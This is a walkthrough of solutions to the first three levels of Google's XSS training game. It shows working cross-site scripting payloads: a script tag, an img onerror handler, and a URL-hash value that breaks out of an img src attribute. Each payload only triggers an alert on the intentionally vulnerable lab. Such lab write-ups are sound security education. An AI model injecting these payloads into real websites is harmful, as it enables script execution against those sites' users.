# GoogleXSSGame
Solutions to the Google XSS game.

Warning, contains spoilers so be careful if you are playing the games. 

##Challenge 1
We are presented with a simple text entry box on a website. A quick check shows that the text box does no filtering or validation and creates a URL link with exactly what is written in to it.
This means we can inject an HTML elemnt straight away. The easiest element to inject is:
```HTML
<script>alert("Winner!")</script>
```
Enter this directly in to the textbox and you should be fine.
Alternately, you can enter this as part of the URL:
```HTML
https://xss-game.appspot.com/level1/frame?query=<script>alert("Winner!")</script>
```

##Challenge 2
We now have a blog type website, where we can enter text that gets displayed as a new entry. 
Entering our solution from Challenge 1 simply creates a new blog post with our entry in the `<blockquote>` tags. We know that this won't work for us. Instead of a direct injection, let's try an error injection to see if we can abuse JavaScript a little bit. Using the `img` tag, let's see if we can use an `onerror` as suggested in the hints:
```JavaScript
<img src="this.gif" onerror=alert("Winner!") />
```
If you enter this as your new blog post, you should see the alert pop up and show that you have outsmarted it. 

##Challenge 3
Looking at how we can manipulate this, we see that the only place we can inject a new element is directly into the URL bar. Taking a look at the JavaScript running here, we can see that this is where the input into the URL bar is processed:
```JavaScript
<script>
      function chooseTab(num) {
        // Dynamically load the appropriate image.
        var html = "Image " + parseInt(num) + "<br>";
        html += "<img src='/static/level3/cloud" + num + ".jpg' />";
        $('#tabContent').html(html);
 
        window.location.hash = num;
 
        // Select the current tab
        var tabs = document.querySelectorAll('.tab');
        for (var i = 0; i < tabs.length; i++) {
          if (tabs[i].id == "tab" + parseInt(num)) {
            tabs[i].className = "tab active";
            } else {
            tabs[i].className = "tab";
          }
        }
 
        // Tell parent we've changed the tab
        top.postMessage(self.location.toString(), "*");
      }
 
      window.onload = function() { 
        chooseTab(self.location.hash.substr(1) || "1");
      }
 
      // Extra code so that we can communicate with the parent page
      window.addEventListener("message", function(event){
        if (event.source == parent) {
          chooseTab(self.location.hash.substr(1));
        }
      }, false);
    </script>
```
The `chooseTag(num)` function is where the input is processed, so let's see if we can abuse this. This function is going to insert an HTML element with a title and the picture link. Interestingly, the title part has the `num` input being passed through a `parseInt(num` function, but the link to the picture does not. We know that we cannot inject anything here, as the `parseInt(num` function will just return a NaN response. However, looking at the next line, we see that the `num` parameter is simply used there without being tested or escaped. This looks like a great place to break in.

If we insert a `1` as the `num` parameter, we expect the website to operate as usual. However, if we can manipulate what is inserted here, we could potentially cause an injection like we did in the previous challenge. Looking at the like that sources the `img` in the JavaScript, let's make it look like this:
```HTML
<img src="/static/level3/cloud1" onerror="alert("Winner!")/>
```
To do this, we just needed to add the input `1' onerror='alert("Winner!")'/>` to the URL.
